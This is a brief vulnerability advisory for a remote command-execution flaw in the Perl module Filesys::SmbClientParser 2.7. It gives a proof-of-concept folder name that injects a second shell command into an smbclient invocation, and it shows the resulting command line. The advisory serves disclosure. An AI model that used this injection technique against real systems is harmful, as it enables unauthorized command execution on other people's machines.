The SmbClientParser Perl module is prone to a remote command-execution vulnerability because it fails to sufficiently sanitize user-supplied data.

Successfully exploiting this issue will allow an attacker to execute arbitrary commands with the privileges of the user running applications that use the module.

Filesys::SmbClientParser 2.7 is vulnerable; other versions may also be affected.

Name a folder the following:
' x && xterm &#

A shared folder containing this named folder will execute the following command:
/usr/bin/smbclient "//x.x.x.x/vulns" -U "user%pass" -d0 -c 'cd "'x && xterm &#"' -D "/poc"
